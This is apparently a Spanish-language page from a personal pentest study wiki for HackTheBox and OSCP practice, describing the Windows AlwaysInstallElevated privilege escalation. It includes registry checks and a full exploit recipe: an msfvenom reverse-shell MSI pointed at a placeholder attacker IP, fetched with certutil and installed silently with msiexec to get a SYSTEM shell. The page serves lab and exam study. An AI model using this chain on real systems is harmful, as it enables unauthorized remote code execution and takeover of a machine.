# Técnica: alwaysinstallelevated

[[00-inicio|Inicio]] · [[Entorno|Entorno]] · [[Puertos|Puertos]] · [[Servicios|Servicios]] · [[Tecnicas|Tecnicas]] · [[Maquinas|Maquinas]] · [[Referencias|Referencias]]

**2 máquina(s)** mencionan esta técnica.

> Esta técnica tiene **recetario de comandos**. Está más abajo, después de la lista de máquinas.

## Comandos

> **Placeholders**: `<IP>` · `<TU_IP>` · `<PUERTO>`

### El chequeo — tienen que estar LAS DOS en 1

```cmd
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

Ambas deben devolver `0x1`. Si solo una está, **no funciona**. Este es el error
más común: ver la de HKLM en 1 y asumir que alcanza.

### Verificar rápido con PowerUp

```powershell
. .\PowerUp.ps1
Get-RegistryAlwaysInstallElevated
```

### Explotar

```bash
# Generar el MSI en tu Kali
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<TU_IP> LPORT=<PUERTO> -f msi -o evil.msi

# Servirlo
python3 -m http.server 8000
```

```cmd
:: En la víctima
certutil -urlcache -split -f http://<TU_IP>:8000/evil.msi C:\Temp\evil.msi
msiexec /quiet /qn /i C:\Temp\evil.msi
```

Tu payload corre como **SYSTEM**, porque el instalador de MSI se eleva.

### Alternativa: MSI generado a mano

Si `msfvenom -f msi` no te sirve (AV, o querés algo más chico), podés armar un
MSI con `WiX` que ejecute un comando arbitrario. Más trabajo, misma idea.

### Si no tenés `msfvenom` a mano

Recordá que `msfvenom` **no está restringido** en el examen. Solo el payload
`meterpreter` y los módulos de Metasploit lo están. Ver [[00-reglas-examen]].

## Referencias

- [[LOLBAS|LOLBAS (espejo local)]] — https://lolbas-project.github.io/
- [HackTricks](https://book.hacktricks.wiki/)

---

## Máquinas

- [[htb-love\|Love]] — 6 mención(es) · Windows · Easy
- [[htb-interactive\|htb-interactive]] — 2 mención(es)

## Cómo ver el contexto

```bash
python3 _sistema/herramientas/buscar.py 'alwaysinstallelevated' -v
python3 _sistema/herramientas/buscar.py 'alwaysinstallelevated' -v --oscp
```
